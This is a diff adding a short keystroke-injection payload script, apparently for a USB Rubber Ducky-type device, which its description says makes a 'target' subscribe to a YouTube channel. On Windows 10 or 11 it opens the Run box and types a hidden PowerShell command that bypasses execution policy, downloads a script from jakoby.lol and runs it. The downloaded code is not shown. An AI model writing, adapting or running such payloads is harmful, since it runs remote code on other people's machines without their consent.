@@ -1,0 +1,14 @@
+REM     Title: Subscribe
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload is meant to make your target subscribe to your YouTube channel
+
+REM     Target: Windows 10, 11
+
+REM Your youtube url needs to be inside both double and single quotes   " ' url ' "   
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $channel="'youtube.com/iamjakoby'";irm jakoby.lol/wj4 | iex
+ENTER
